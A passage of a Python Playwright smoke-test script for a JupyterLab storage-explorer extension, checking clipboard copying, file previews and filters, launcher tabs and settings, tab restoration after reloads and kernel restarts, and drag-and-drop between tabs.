@lab_check
def local_paths_copied(lab: Lab, page: Page) -> None:
    # On a local disk, items have a plain path besides their file:/// URL:
    # "Copy path" copies it, and "Copy" puts it on the system clipboard.
    folder = lab.root / "local-disk"
    folder.mkdir(exist_ok=True)
    (folder / "notes.txt").write_text("notes", encoding="utf-8")
    page.context.grant_permissions(["clipboard-read", "clipboard-write"])
    source = f"from jupyter_storage_explorer import StorageExplorer\nStorageExplorer({str(folder)!r})"
    x = Explorer(lab, page, source)
    clipboard = "() => navigator.clipboard.readText()"
    x.menu(x.row("notes.txt"), "Copy path")
    expect(x.status).to_contain_text("Copied path")
    assert page.evaluate(clipboard) == str(folder / "notes.txt")
    x.menu(x.row("notes.txt"), "Copy URL")
    expect(x.status).to_contain_text("Copied URL")
    assert page.evaluate(clipboard) == (folder / "notes.txt").as_uri()
    x.row("notes.txt").click(button="right")
    x.el.locator(".jse-menu:not(.jse-submenu) > .jse-menu-item:visible").filter(
        has=page.get_by_text("Copy", exact=True)
    ).click()
    expect(x.status).to_contain_text("Copied notes.txt")
    assert page.evaluate(clipboard) == str(folder / "notes.txt")


@lab_check
def python_callbacks(lab: Lab, page: Page) -> None:
    x = Explorer(lab, page, CALLBACKS)
    selected, rows = page.locator(".smoke-selected"), page.locator(".smoke-rows")
    expect(x.preview).to_contain_text("Click a file to preview it")
    x.go("curated")
    x.row("orders.parquet").click()  # the open panel previews it
    expect(selected).to_have_text("orders.parquet")
    expect(x.preview.locator(".jse-query-status")).to_have_text("Rows 1–100 / 2,400")
    expect(rows).to_have_text("2400")
    header = x.preview.locator(
        "th", has=page.locator(".jse-query-name", has_text="channel")
    ).first
    header.locator(".jse-query-filter").click()
    dialog = x.el.locator(".jse-confirm:visible")
    dialog.locator("select").first.select_option(label="Contains")
    dialog.locator("input[type=text], input:not([type])").first.fill("wholesale")
    dialog.get_by_role("button", name="Apply").click()
    expect(rows).to_have_text("341")
    x.preview.press("Escape")
    expect(x.preview).to_be_hidden()
    expect(rows).to_have_text("none")
    x.row("customers").dblclick()
    expect(selected).to_have_text("-")


def open_launcher_tab(lab: Lab, page: Page) -> Locator:
    """A new launcher tab, once its explorer shows the lake: its explorer."""
    page.goto(lab.url())
    page.locator(".jp-LauncherCard", has_text="Storage Explorer").first.click()
    return launcher_explorer(page)


def launcher_explorer(page: Page, panel: str = ".jse-launcher-panel") -> Locator:
    tab = page.locator(f"{panel} .jse-browser")
    expect(tab.locator(".jse-tree .jse-node").first).to_be_visible(timeout=90_000)
    return tab


def tab_go(page: Page, tab: Locator, storage: str, folder: str) -> None:
    """Show ``folder`` of ``storage`` in a launcher tab's explorer."""
    tab.locator(".jse-fs-select").select_option(storage)
    tab.locator(".jse-tree .jse-node").filter(
        has=page.get_by_text(folder, exact=True)
    ).first.click()
    expect(tab.locator(".jse-crumb").last).to_have_text(folder)


@lab_check
def launcher_tab(lab: Lab, page: Page) -> None:
    tab = open_launcher_tab(lab, page)
    expect(tab.locator(".jse-tree .jse-node").first).to_contain_text("sales-lake")
    expect(tab.locator(".jse-fs-select")).to_be_visible()


@lab_check
def launcher_settings(lab: Lab, page: Page) -> None:
    # The settings button opens the user's launcher.py in JupyterLab's editor,
    # created from the template if missing (once the user agrees); saved, it
    # applies to new tabs.
    path = lab.folder / "config" / "storage-explorer" / "launcher.py"
    with lab.launcher_settings(_lab.LAUNCHER_PY):
        tab = open_launcher_tab(lab, page)
        path.unlink()  # read when the tab started
        dialog = tab.locator(".jse-dialog:visible")
        tab.locator(".jse-settings-btn").click()
        expect(dialog).to_contain_text("Create your launcher settings")
        dialog.get_by_role("button", name="Cancel").click()
        expect(dialog).to_be_hidden()
        assert not path.exists()
        tab.locator(".jse-settings-btn").click()
        dialog.get_by_role("button", name="Create").click()
        editor = page.locator(".jp-FileEditor .cm-content").first
        expect(editor).to_contain_text("def filesystems():")
        expect(page.locator(".lm-TabBar-tab.jp-mod-current")).to_contain_text(
            "launcher.py"
        )
        assert "def filesystems():" in path.read_text(encoding="utf-8")
        editor.click()
        page.keyboard.press("Control+End")
        # Not typed: the editor would indent and close brackets itself.
        page.keyboard.insert_text(
            "\n\ndef parameters():\n    return {'open_preview': True}\n"
        )
        page.keyboard.press("Control+s")
        wait_for(lambda: "open_preview" in path.read_text(encoding="utf-8"), "the save")
        tab = open_launcher_tab(lab, page)  # the folder it opens on, as no storages
        expect(tab.locator(".jse-preview-panel")).to_contain_text(
            "Click a file to preview it"
        )


@lab_check
def launcher_tab_reload(lab: Lab, page: Page) -> None:
    # The tab reopens where it was after a page reload: the storage shown, and
    # each storage's folder (index.ts saves them with the workspace).
    tab = open_launcher_tab(lab, page)
    tab_go(page, tab, "Sales lake", "pipelines")
    tab_go(page, tab, "Scratch", "exports")
    page.wait_for_timeout(3000)  # the workspace saved
    page.goto(re.sub(r"([?&])reset&?", r"\1", page.url))  # the same workspace, kept
    tab = launcher_explorer(page)
    expect(tab.locator(".jse-fs-select")).to_have_value("Scratch")
    expect(tab.locator(".jse-crumb").last).to_have_text("exports")
    tab.locator(".jse-fs-select").select_option("Sales lake")
    expect(tab.locator(".jse-crumb").last).to_have_text("pipelines")


@lab_check
def drag_between_tabs(lab: Lab, page: Page) -> None:
    # Two launcher tabs side by side, each with its own kernel: a file dragged
    # from one onto the other is pasted there by its location, which names
    # its storage. The demo storages are in each kernel's own memory, so the
    # other kernel refuses it rather than read its own memory.
    first = open_launcher_tab(lab, page)
    page.keyboard.press("Control+Shift+L")
    page.locator(".jp-LauncherCard", has_text="Storage Explorer").first.click()
    expect(page.locator(".jse-launcher-panel")).to_have_count(2, timeout=30_000)
    # Side by side: the second tab dragged to the right edge of the main area
    # (JupyterLab 4.0's tab menu has no "Split Tab").
    page.locator(".lm-TabBar-tab", has_text="Storage Explorer").last.hover()
    dock = page.locator("#jp-main-dock-panel").bounding_box()
    assert dock is not None
    page.mouse.down()
    page.mouse.move(
        dock["x"] + dock["width"] - 30, dock["y"] + dock["height"] / 2, steps=15
    )
    page.mouse.up()
    second = launcher_explorer(page, ".jse-launcher-panel:nth-child(n)")
    explorers = page.locator(".jse-launcher-panel .jse-browser")
    expect(explorers).to_have_count(2, timeout=90_000)
    first, second = explorers.all()
    expect(second.locator(".jse-tree .jse-node").first).to_be_visible(timeout=90_000)
    tab_go(page, second, "Scratch", "exports")
    row = (
        first.locator("tbody tr")
        .filter(has=page.get_by_text("catalog.json", exact=True))
        .first
    )
    expect(row).to_have_attribute("title", re.compile("URL: "))  # its URL known
    row.drag_to(second.locator(".jse-list"), target_position={"x": 100, "y": 150})
    dialog = second.locator(".jse-confirm:visible")
    expect(dialog).to_contain_text("Paste catalog.json?")
    dialog.get_by_role("button", name="Paste", exact=True).click()
    expect(second).to_contain_text("not reachable from this kernel")
    expect(
        second.locator("tbody tr").filter(
            has=page.get_by_text("catalog.json", exact=True)
        )
    ).to_have_count(0)
    expect(row).to_be_visible()


@lab_check
def launcher_tab_restart(lab: Lab, page: Page) -> None:
    # A kernel restart loses the explorer: a new tab replaces the tab, where it was.
    tab = open_launcher_tab(lab, page)
    tab_go(page, tab, "Sales lake", "pipelines")
    old = page.locator(".jse-launcher-panel").first.get_attribute("id")
    page.locator(".lm-MenuBar-itemLabel", has_text="Kernel").click()
    page.locator(".lm-Menu-itemLabel", has_text="Restart Kernel…").first.click()
    page.locator(".jp-Dialog-footer .jp-Dialog-button", has_text="Restart").click()
    tab = launcher_explorer(page, f'.jse-launcher-panel:not([id="{old}"])')
    expect(tab.locator(".jse-crumb").last).to_have_text("pipelines")
    expect(page.locator(".jse-launcher-panel")).to_have_count(1)


# --- Helpers ---


def paste_from_lake(x: Explorer, name: str, folder: str | None = None) -> None:
    """Copy file ``name`` of the lake (in its top folder, or ``folder`` in
    it) into Scratch's top folder."""
    x.storage("Sales lake")
    if folder is None:
        x.el.locator(".jse-crumb", has_text="/sales-lake").click()
    else:
        x.node(folder).click()
    x.menu(x.row(name), "Copy")
    x.top("Scratch")
    x.list_menu(f"Paste {name}")
    x.button("Paste").click()
    expect(x.row(name)).to_be_visible()


def new_folder(x: Explorer, name: str) -> None:
    x.list_menu("Create a folder")
    x.el.locator(".jse-confirm:visible .jse-name-input").fill(name)
    x.button("Create").click()
    expect(x.row(name)).to_be_visible()


def wait_for(condition: Callable[[], bool], what: str, timeout: float = 15) -> None:
    deadline = time.monotonic() + timeout
    while not condition():
        if time.monotonic() > deadline:
            raise AssertionError(f"no {what} after {timeout} s")
        time.sleep(0.2)


# --- Running ---


def main(names: list[str]) -> int:
    unknown = set(names) - {*CHECKS, *LAB_CHECKS}
    if unknown:
        print(f"unknown checks: {', '.join(sorted(unknown))}")
        return 2
    chosen = [n for n in [*CHECKS, *LAB_CHECKS] if not names or n in names]
    failed = []
    with _lab.lab() as lab, lab.page(1400, 1000, scale=1) as page:
        page.set_default_timeout(20_000)
        x = None
        for name in chosen:
            start = time.monotonic()
            try:
                if name in LAB_CHECKS:
                    LAB_CHECKS[name](lab, page)
                    x = None  # the page has left the notebook
                else:
                    x = x or Explorer(lab, page)
                    CHECKS[name](x)
            except Exception as exc:
                failed.append(name)
                shot = HERE / f"smoke-{name}.png"
                page.screenshot(path=str(shot))
                print(f"FAIL {name}: {type(exc).__name__}: {str(exc).splitlines()[0]}")
                print("".join(traceback.format_exception(exc, limit=-3)), end="")
                print(f"     screenshot: {shot.relative_to(_lab.REPO).as_posix()}")
                x = None  # the next check starts on a new notebook
            else:
                print(f"ok   {name} ({time.monotonic() - start:.1f} s)")
    print(f"\n{len(chosen) - len(failed)} of {len(chosen)} checks passed")
    return 1 if failed else 0


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
